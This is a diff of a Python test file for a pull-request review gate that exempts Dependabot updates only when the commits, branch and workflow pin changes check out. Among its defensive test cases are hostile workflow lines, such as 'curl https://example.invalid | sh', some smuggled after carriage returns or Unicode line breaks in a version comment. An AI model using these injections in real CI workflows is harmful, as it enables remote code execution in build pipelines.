@@ -13,6 +13,8 @@ import json
 import sys
 from pathlib import Path
 
+import yaml
+
 HEAD = "195e30d8b02d5ba36e30caf889bb6bb3b1be92e2"
 OTHER = "5753428684342e7e0fb38a10426a342ec61ffaaa"
 BASE = "2c673bb56bf216ad60928dd9703143ac41f052ec"
@@ -41,7 +43,56 @@ def review(state: str, commit: str = HEAD, login: str = REVIEWER, kind: str = "B
     }
 
 
-FILES = [{"filename": ".github/workflows/ci.yml", "previous_filename": None}]
+OLD_PIN = "a1" * 20
+NEW_PIN = "b2" * 20
+
+
+def uses_line(
+    action: str = "actions/checkout", sha: str = NEW_PIN, comment: str = "v7.0.2", lead: str = "      - "
+) -> str:
+    """One workflow line as Dependabot writes it: an action pinned to a full commit, with its version comment."""
+    return f"{lead}uses: {action}@{sha}  # {comment}"
+
+
+def workflow_file(removed: list[str], added: list[str], name: str = ".github/workflows/ci.yml", **changes) -> dict:
+    """A modified workflow as the comparison reports it, with the patch those lines make."""
+    patch = (
+        "@@ -20,5 +20,5 @@\n steps:\n"
+        + "".join(f"-{line}\n" for line in removed)
+        + "".join(f"+{line}\n" for line in added)
+        + " \n"
+    )
+    item = {
+        "filename": name,
+        "previous_filename": None,
+        "status": "modified",
+        "additions": len(added),
+        "deletions": len(removed),
+        "patch": patch,
+    }
+    item.update(changes)
+    return item
+
+
+def pin_bump(count: int = 1, name: str = ".github/workflows/ci.yml", **changes) -> dict:
+    """A workflow edit that only moves the pins of actions already in use: what a Dependabot update writes."""
+    return workflow_file([uses_line(sha=OLD_PIN, comment="v7.0.1")] * count, [uses_line()] * count, name, **changes)
+
+
+def commit(
+    sha: str = HEAD, author: object = "dependabot[bot]", committer: object = "web-flow", verified: object = True
+) -> dict:
+    """One commit of the comparison as the gate projects it; a Dependabot commit is signed by GitHub itself."""
+    return {"sha": sha, "author": author, "committer": committer, "verified": verified}
+
+
+FILES = [pin_bump()]
+REPOSITORY = "mikomiel/advisory-radar"
+DEPENDABOT_AUTHORS = ("app/dependabot", "dependabot[bot]")
+#: Marks "no branch given": the snapshot then names the branch of whoever opened the pull request, because Dependabot
+#: pushes its own `dependabot/...` branch to the repository it updates. A test of the dependency exemption does not
+#: have to repeat that, and a case that breaks it says so by passing a branch or a repository of its own.
+BY_AUTHOR = object()
 
 
 def entry(
@@ -55,10 +106,16 @@ def entry(
     base: str = BASE,
     count_head: str | None = None,
     count_base: str | None = None,
-    branch: str = "feat/example",
-    head_repo: str = "mikomiel/advisory-radar",
+    branch: object = BY_AUTHOR,
+    head_repo: object = REPOSITORY,
+    base_repo: object = REPOSITORY,
+    commits: list | None = None,
+    total_commits: int | None = None,
 ) -> dict:
     chosen = FILES if files is None else files
+    chosen_commits = [commit(head)] if commits is None else commits
+    if branch is BY_AUTHOR:
+        branch = "dependabot/uv/example" if author in DEPENDABOT_AUTHORS else "feat/example"
     return {
         "number": number,
         "head": head,
@@ -67,12 +124,15 @@ def entry(
         "author": author,
         "branch": branch,
         "head_repo": head_repo,
+        "base_repo": base_repo,
         "reviews": list(reviews),
         "files": chosen,
         "changed": len(chosen) if changed is None else changed,
         # A coherent snapshot: the count describes the same two commits as the comparison.
         "count_head": head if count_head is None else count_head,
         "count_base": base if count_base is None else count_base,
+        "commits": chosen_commits,
+        "total_commits": len(chosen_commits) if total_commits is None else total_commits,
     }
 
 
@@ -216,16 +276,7 @@ def test_the_cli_prints_one_line_per_head_and_refuses_a_bad_snapshot():
 
 
 def test_a_dependabot_update_needs_no_app_review():
-    state, description = decisions(
-        [
-            entry(
-                17,
-                reviews=[],
-                author="app/dependabot",
-                files=[{"filename": ".github/workflows/ci.yml", "previous_filename": None}],
-            )
-        ]
-    )[HEAD]
+    state, description = decisions([entry(17, reviews=[], author="app/dependabot", files=[pin_bump()])])[HEAD]
     assert state == "success"
     assert "not required" in description and "dependabot" in description
 
@@ -265,10 +316,7 @@ def test_the_exemption_needs_a_dependency_only_path_set():
                 17,
                 reviews=[],
                 author="app/dependabot",
-                files=[
-                    {"filename": ".github/workflows/ci.yml", "previous_filename": None},
-                    {"filename": "src/x.py", "previous_filename": None},
-                ],
+                files=[pin_bump(), {"filename": "src/x.py", "previous_filename": None}],
             )
         ]
     )
@@ -378,6 +426,207 @@ def test_a_comment_holds_a_dependency_update():
     # any review at all is used as-is; a comment is not an approval
     commented = decisions([entry(17, reviews=[review("COMMENTED")], author="app/dependabot")])[HEAD]
     assert commented[0] == "pending"
+
+
+def dependabot_state(**changes) -> str:
+    return decisions([entry(17, reviews=[], author="dependabot[bot]", **changes)])[HEAD][0]
+
+
+def test_the_exemption_reads_every_commit_not_only_who_opened_the_pull_request():
+    """The author is whoever opened the pull request, and a branch takes more commits afterwards.
+
+    A maintainer who pushes to a Dependabot branch leaves the pull request's author unchanged, so the exemption
+    must look at the commits themselves: each one the exempt author's own, and signed by GitHub.
+    """
+    cases = {
+        "a commit by a maintainer": [commit(OTHER), commit(HEAD, author="mikomiel")],
+        # an author is only an email address; the signature is checked against the committer, so a person's own
+        # signed commit can carry the bot's name as its author and still read as verified
+        "a maintainer's signature under the bot's name": [commit(HEAD, committer="mikomiel")],
+        "an unsigned commit": [commit(HEAD, verified=False)],
+        "a signature the API did not report": [commit(HEAD, verified=None)],
+        "a string where the verdict belongs": [commit(HEAD, verified="true")],
+        "an author GitHub could not resolve": [commit(HEAD, author=None)],
+        "a committer GitHub could not resolve": [commit(HEAD, committer=None)],
+        "an author that is not a name": [commit(HEAD, author=["dependabot[bot]"])],
+        "no commits": [],
+        "a list that does not carry the head": [commit(OTHER)],
+        "an item that is not a commit": [commit(OTHER), "dependabot[bot]", commit(HEAD)],
+        "a commit without an id": [{"author": "dependabot[bot]", "committer": "web-flow", "verified": True}],
+    }
+    for label, commits in cases.items():
+        assert dependabot_state(commits=commits) == "pending", label
+
+
+def test_a_commit_list_shorter_than_the_comparison_proves_nothing():
+    # compare lists at most 250 commits, so a short list can hide a later commit by somebody else
+    assert dependabot_state(commits=[commit(HEAD)], total_commits=2) == "pending"
+    assert dependabot_state(commits=[commit(HEAD)], total_commits=251) == "pending"
+    # a count that is absent, null or not a number cannot show the list complete; a boolean is not a number
+    absent = entry(17, reviews=[], author="dependabot[bot]")
+    del absent["total_commits"]
+    assert decisions([absent])[HEAD][0] == "pending"
+    for count in (None, "1", 1.0, True):
+        counted = {**entry(17, reviews=[], author="dependabot[bot]"), "total_commits": count}
+        assert decisions([counted])[HEAD][0] == "pending", repr(count)
+
+
+def test_a_snapshot_without_commits_cannot_be_exempt():
+    # an entry from before the commits were carried must fail closed, not be read as an empty, harmless list
+    legacy = entry(17, reviews=[], author="dependabot[bot]")
+    del legacy["commits"], legacy["total_commits"]
+    assert decisions([legacy])[HEAD][0] == "pending"
+    # and a value that is not a list is refused, not iterated or measured: one bad entry must not stop the plan
+    for odd in (None, "abc", {"sha": HEAD}, 5):
+        broken = {**entry(17, reviews=[], author="dependabot[bot]"), "commits": odd, "total_commits": 1}
+        assert decisions([broken])[HEAD][0] == "pending", repr(odd)
+
+
+def test_a_dependabot_update_of_signed_commits_is_exempt():
+    assert dependabot_state(commits=[commit(OTHER), commit(HEAD)]) == "success"
+    # a committer that is the exempt author itself is as good as the one GitHub records for its own signature
+    assert dependabot_state(commits=[commit(HEAD, committer="dependabot[bot]")]) == "success"
+    assert decisions([entry(17, reviews=[], author="app/dependabot", commits=[commit(HEAD)])])[HEAD][0] == "success"
+
+
+def test_a_dependabot_update_must_come_from_a_dependabot_branch_of_this_repository():
+    """Dependabot pushes `dependabot/...` branches to the repository it updates, so the exemption asks for that shape.
+
+    This narrows what qualifies. It does not authenticate the bot: see the documentation test below.
+    """
+    assert dependabot_state() == "success"
+    cases = {
+        "a branch of any other name": {"branch": "feat/example"},
+        "the prefix in the middle of the name": {"branch": "feat/dependabot/example"},
+        "the prefix without its slash": {"branch": "dependabot-example"},
+        "the prefix in another case": {"branch": "Dependabot/uv/example"},
+        "no branch": {"branch": None},
+        "a branch that is not a name": {"branch": ["dependabot/uv/example"]},
+        "a head in a fork": {"head_repo": "someone/advisory-radar"},
+        "a head whose repository is gone": {"head_repo": ""},
+        "a head repository that is not a name": {"head_repo": None},
+        "a base repository that is unknown": {"base_repo": ""},
+        "a base repository that is not a name": {"base_repo": None},
+        "two repositories that are both unknown": {"head_repo": "", "base_repo": ""},
+        "two repositories that are both missing": {"head_repo": None, "base_repo": None},
+    }
+    for label, change in cases.items():
+        assert dependabot_state(**change) == "pending", label
+    # a snapshot from before the base repository travelled with it must fail closed, not be read as a match
+    legacy = entry(17, reviews=[], author="dependabot[bot]")
+    del legacy["base_repo"]
+    assert decisions([legacy])[HEAD][0] == "pending"
+    # the other login is held to the same shape
+    assert decisions([entry(17, reviews=[], author="app/dependabot", branch="feat/example")])[HEAD][0] == "pending"
+
+
+def test_the_documentation_states_the_conditions_of_the_dependency_exemption_and_what_they_do_not_prove():
+    """The comment on the signing committer once claimed more than the check shows; the page must not repeat it.
+
+    A squash merge of a Dependabot pull request is written by GitHub as the pull request's author, committed and
+    signed by GitHub, whatever the merged branch held. Every identity condition passes for such a commit, so the
+    exemption trusts people with write access and says so.
+    """
+    docs = (ROOT / "docs" / "review-and-merge.md").read_text()
+    bullet = docs.split("**Dependency updates are exempt from the App review.**", 1)[1].split("\n- ", 1)[0]
+    for fact in ("`dependabot/`", "not a fork's", "squash merge", "people with write access are trusted"):
+        assert fact in bullet, f"the dependency exemption is documented without {fact!r}"
+
+
+def test_dependabot_names_its_branches_with_the_prefix_that_the_exemption_asks_for():
+    """Dependabot joins the parts of a branch name with ``/`` unless an update sets its own separator.
+
+    A different separator would name every branch ``dependabot-...``, and the exemption would end for every update
+    without a failing check: the planner fails closed on a branch that lacks its prefix.
+    """
+    assert plan.DEPENDABOT_BRANCH_PREFIX == "dependabot/"
+    updates = yaml.safe_load((ROOT / ".github" / "dependabot.yml").read_text())["updates"]
+    assert updates
+    for update in updates:
+        separator = (update.get("pull-request-branch-name") or {}).get("separator", "/")
+        assert separator == "/", f"{update['package-ecosystem']}: its branches would not start with the prefix"
+
+
+def test_the_contributor_guide_describes_the_exemptions_and_the_latest_tag_as_they_are():
+    """CONTRIBUTING.md repeats two facts that other files own, and each had drifted from its owner.
+
+    The Dependabot exemption is no longer "touches only manifests" (docs/review-and-merge.md and the planner own
+    its conditions), and ``latest`` moves only for the highest stable tag (release.yml owns that rule).
+    """
+    guide = " ".join((ROOT / "CONTRIBUTING.md").read_text().split())
+    assert "touches only manifests" not in guide, "the Dependabot exemption is described as manifests only"
+    assert "exempt Dependabot manifest change" not in guide
+    assert "`dependabot/` branch of this repository" in guide
+    assert "only when the tag is the highest stable `vX.Y.Z` tag, `latest`" in guide
+    release = (ROOT / ".github" / "workflows" / "release.yml").read_text()
+    assert "highest stable" in release, "release.yml no longer applies the rule that the guide describes"
+
+
+def test_a_workflow_edit_that_only_moves_pins_is_exempt():
+    several = [pin_bump(count=3), pin_bump(count=2, name=".github/workflows/release.yml")]
+    assert dependabot_state(files=several) == "success"
+    nested = workflow_file(
+        [uses_line(action="github/codeql-action/analyze", sha=OLD_PIN, comment="v3.27.0", lead="        ")],
+        [uses_line(action="github/codeql-action/analyze", comment="v3.28.0", lead="        ")],
+    )
+    assert dependabot_state(files=[nested]) == "success"
+    # a manifest beside the workflow needs no patch: only the workflow tree is held to the pin shape
+    assert dependabot_state(files=[{"filename": "uv.lock", "previous_filename": None}, pin_bump()]) == "success"
+
+
+def test_a_workflow_edit_that_is_more_than_a_pin_keeps_the_review_requirement():
+    """The path says only that a workflow changed; the patch says what it can now do."""
+    old, new = uses_line(sha=OLD_PIN, comment="v7.0.1"), uses_line()
+    cases = {
+        "a run line": workflow_file(["      run: echo ok"], ["      run: curl https://example.invalid | sh"]),
+        "a with line": workflow_file(["          fetch-depth: 0"], ["          fetch-depth: 1"]),
+        "a permission": workflow_file(["  contents: read"], ["  contents: write"]),
+        "a second line beside the pin": workflow_file([old], [new, "      - run: echo extra"]),
+        "a dropped pin": workflow_file([old], []),
+        "another action": workflow_file([old], [uses_line(action="someone/checkout")]),
+        "a mutable tag": workflow_file([old], ["      - uses: actions/checkout@v8"]),
+        "a short commit id": workflow_file([old], [uses_line(sha="b2" * 10)]),
+        "an indentation that moved": workflow_file([old], [uses_line(lead="    - ")]),
+        "a list marker that appeared": workflow_file([uses_line(sha=OLD_PIN, lead="        ")], [new]),
+        "a comment line that names an action": workflow_file(["      # " + old.strip()], ["      # " + new.strip()]),
+        # A YAML parser reads these as the end of the line; git does not. The fragment after the break starts with a
+        # space so that a splitter which broke here too would take it for a context line and let it through.
+        "a carriage return in the comment": workflow_file(
+            [old], [uses_line(comment="v7.0.2\r      run: curl https://example.invalid | sh")]
+        ),
+        "a unicode line break in the comment": workflow_file([old], [uses_line(comment="v7.0.2\u2028      run: id")]),
+        "a next-line character in the comment": workflow_file([old], [uses_line(comment="v7.0.2\x85      run: id")]),
+        "a tab in the comment": workflow_file([old], [uses_line(comment="v7.0.2\trun: id")]),
+        "counts that do not match the patch": workflow_file([old], [new, new], additions=1),
+        "an addition the patch hides": workflow_file([old], [new], additions=2),
+        "a count of zero": workflow_file([], [], additions=0, deletions=0),
+        "a patch with a stray line": {**pin_bump(), "patch": pin_bump()["patch"] + "run: id\n"},
+        "no patch carried": pin_bump(patch=None),
+        "a patch that is not text": pin_bump(patch=["+x"]),
+        "a new file": pin_bump(status="added"),
+        "a removed file": pin_bump(status="removed"),
+        "no status": {key: value for key, value in pin_bump().items() if key != "status"},
+        "a renamed file": pin_bump(status="renamed", previous_filename=".github/workflows/old.yml"),
+        "a modified file that names a previous one": pin_bump(previous_filename=".github/workflows/old.yml"),
+        # the new name is a manifest, so only the old name puts the workflow tree in play
+        "a workflow renamed onto a manifest name": {
+            "filename": "uv.lock",
+            "previous_filename": ".github/workflows/ci.yml",
+            "status": "renamed",
+            "additions": 1,
+            "deletions": 1,
+            "patch": pin_bump()["patch"],
+        },
+        "a removal written after its addition": {
+            **pin_bump(),
+            "patch": f"@@ -20,5 +20,5 @@\n steps:\n+{new}\n-{old}\n",
+        },
+        "a bare path": {"filename": ".github/workflows/ci.yml", "previous_filename": None},
+    }
+    for label, item in cases.items():
+        assert dependabot_state(files=[item]) == "pending", label
+    # one unproven workflow among proven ones is enough
+    assert dependabot_state(files=[pin_bump(), cases["a run line"]]) == "pending"
 
 
 def test_the_generated_release_pull_request_needs_no_app_review():
